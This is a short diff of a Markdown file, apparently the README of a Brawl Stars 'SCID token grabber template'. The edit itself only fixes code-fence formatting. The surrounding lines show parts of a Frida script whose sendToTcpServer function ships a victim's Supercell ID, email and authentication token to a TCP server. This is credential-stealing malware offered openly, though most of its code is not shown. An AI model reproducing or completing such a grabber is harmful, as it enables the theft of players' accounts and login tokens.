@@ -54,7 +54,8 @@ function sendToTcpServer(supercellId, email, scidToken) {
     socket.close();
 
     console.log("Data sent to TCP server");
-}```
+}
+```
 # Full Code
 ```js
 // brawl stars scid token grabber template by Kxrimmmm
@@ -104,4 +105,4 @@ Java.perform(function () {
 
         console.log("Data sent to TCP server");
     }
-}); ```
+});
